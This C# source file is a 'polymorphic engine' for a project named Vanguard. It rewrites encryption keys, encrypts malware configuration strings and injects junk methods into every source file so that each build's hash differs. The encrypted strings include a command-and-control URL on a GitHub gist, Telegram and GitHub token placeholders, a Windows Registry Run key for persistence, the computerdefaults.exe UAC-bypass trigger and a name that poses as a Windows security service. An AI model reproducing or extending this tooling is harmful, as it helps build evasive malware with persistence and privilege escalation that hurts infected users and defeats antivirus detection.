using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace PolyBuilder
{
    class Program
    {
        private static byte[] _masterKey = new byte[32];
        private static string _safetyManagerPath = Path.Combine("defense", "SafetyManager.cs");
        private static string _stringVaultPath = Path.Combine("defense", "StringVault.cs");

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Vanguard C# Polymorphic Engine Starting...");

            // Logic to find the root directory (where the 'defense' folder exists)
            string currentDir = Directory.GetCurrentDirectory();
            while (!string.IsNullOrEmpty(currentDir) && !Directory.Exists(Path.Combine(currentDir, "defense")))
            {
                currentDir = Path.GetDirectoryName(currentDir);
            }

            if (string.IsNullOrEmpty(currentDir) || !Directory.Exists(Path.Combine(currentDir, "defense")))
            {
                Console.WriteLine("[!] Error: Could not locate the project root directory ('defense' folder not found).");
                return;
            }

            Directory.SetCurrentDirectory(currentDir);
            Console.WriteLine($"[+] Working Directory Set: {Directory.GetCurrentDirectory()}");

            // 1. Generate Master Keys
            RandomNumberGenerator.Fill(_masterKey);
            string keyHex = string.Join(", ", _masterKey.Select(b => $"0x{b:X2}"));
            Console.WriteLine($"[+] Generated new Master Key ({_masterKey.Length} bytes)");

            // 2. Update SafetyManager with new Master Key
            UpdateSafetyManager(keyHex);

            // 3. Encrypt Sensitive Strings in StringVault
            UpdateStringVault();

            // 4. Junk Code Injection (Polymorphism)
            InjectJunkCode();

            Console.WriteLine("[SUCCESS] Polymorphic mutation complete. Binary is now unique.");
        }

        static void UpdateSafetyManager(string keyHex)
        {
            string content = File.ReadAllText(_safetyManagerPath);
            content = Regex.Replace(content, @"private static readonly byte\[\] _compileKey = new byte\[32\] \{ [^}]* \};", 
                                     $"private static readonly byte[] _compileKey = new byte[32] {{ {keyHex} }};");

            // Also randomize the XOR_SALT_STATIC
            byte[] salt = new byte[12];
            RandomNumberGenerator.Fill(salt);
            string saltHex = string.Join(", ", salt.Select(b => $"0x{b:X2}"));
            content = Regex.Replace(content, @"private static readonly byte\[\] XOR_SALT_STATIC = new byte\[\] \{ [^}]* \};", 
                                     $"private static readonly byte[] XOR_SALT_STATIC = new byte[] {{ {saltHex} }};");

            File.WriteAllText(_safetyManagerPath, content);
            Console.WriteLine("[+] SafetyManager.cs updated with new Master Key and Salt.");
        }

        static void UpdateStringVault()
        {
            try {
                string content = File.ReadAllText(_stringVaultPath);

                var targets = new Dictionary<string, string>
                {
                    { "C2_URL", "https://gist.githubusercontent.com/ptrkxlord/vanguard_c2" },
                    { "BOT_TOKEN", "7265936412:AAH-YOUR-REAL-TOKEN-HERE" },
                    { "GIST_TOKEN", "ghp_YOUR_REAL_GITHUB_TOKEN_HERE" },
                    { "ADMIN_ID", "123456789" },
                    { "REG_RUN", @"Software\Microsoft\Windows\CurrentVersion\Run" },
                    { "UA_CHROME", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" },
                    { "MS_TRIGGER", "computerdefaults.exe" },
                    { "APP_NAME", "WindowsSecurityHealth" }
                };

                foreach (var target in targets)
                {
                    Console.WriteLine($"    [>] Encrypting: {target.Key}");
                    var (cipher, iv, tag) = EncryptGcm(target.Value, _masterKey);
                    
                    string hexCipher = string.Join(", ", cipher.Select(b => $"0x{b:X2}"));
                    string hexIv = string.Join(", ", iv.Select(b => $"0x{b:X2}"));
                    string hexTag = string.Join(", ", tag.Select(b => $"0x{b:X2}"));

                    string tagStr = target.Key;
                    string lowTag = tagStr.ToLower();

                    // REPLACE ALL THREE AT ONCE to avoid regex overlap corruption
                    string pattern = $"(?s)/\\* \\[POLY_STRING_START:{tagStr}\\] \\*/.*?/\\* \\[POLY_STRING_END\\] \\*/";
                    string replacement = $"/* [POLY_STRING_START:{tagStr}] */\n" +
                                       $"        private static readonly byte[] _{lowTag}_raw = new byte[] {{ {hexCipher} }};\n" +
                                       $"        private static readonly byte[] _{lowTag}_iv  = new byte[] {{ {hexIv} }};\n" +
                                       $"        private static readonly byte[] _{lowTag}_tag = new byte[] {{ {hexTag} }};\n" +
                                       $"        /* [POLY_STRING_END] */";

                    content = Regex.Replace(content, pattern, replacement);
                }

                File.WriteAllText(_stringVaultPath, content);
                Console.WriteLine("[+] StringVault.cs mutated with encrypted secrets.");
            } catch (Exception ex) {
                Console.WriteLine($"[!] Error updating StringVault: {ex.Message}");
            }
        }

        static (byte[] cipher, byte[] iv, byte[] tag) EncryptGcm(string plain, byte[] key)
        {
            using (var aes = new AesGcm(key, 16))
            {
                byte[] iv = new byte[12];
                RandomNumberGenerator.Fill(iv);
                byte[] data = Encoding.UTF8.GetBytes(plain);
                byte[] cipher = new byte[data.Length];
                byte[] tag = new byte[16];
                aes.Encrypt(iv, data, cipher, tag);
                return (cipher, iv, tag);
            }
        }

        static void InjectJunkCode()
        {
            Console.WriteLine("[+] Injecting Junk Code for Hash Mutation...");
            var files = Directory.GetFiles(".", "*.cs", SearchOption.AllDirectories);
            var rng = new Random();

            foreach (var file in files)
            {
                string name = Path.GetFileName(file);
                // SKIP sensitive files and build tools
                if (name == "SafetyManager.cs" || name == "StringVault.cs" || file.Contains("PolyBuilder") || file.Contains("Program.cs")) continue;

                try 
                {
                    string content = File.ReadAllText(file);
                    if (content.Contains("[POLY_JUNK]")) continue;

                    string guid8 = Guid.NewGuid().ToString("N").Substring(0, 8);
                    long val = rng.Next(10000, 99999);
                    string junk = "\n        // [POLY_JUNK]\n        private static void _vanguard_" + guid8 + "() {\n" +
                                  "            int val = " + val + ";\n" +
                                  "            if (val > 50000) Console.WriteLine(\"Hash:\" + " + val + ");\n" +
                                  "        }\n";

                    // SAFE INJECTION: Inject right after the first class declaration opening brace
                    string newContent = Regex.Replace(content, @"(class\s+\w+[\s\n\r]*{)", "$1" + junk);
                    if (newContent != content)
                    {
                        File.WriteAllText(file, newContent);
                    }
                }
                catch { }
            }
        }
    }
}
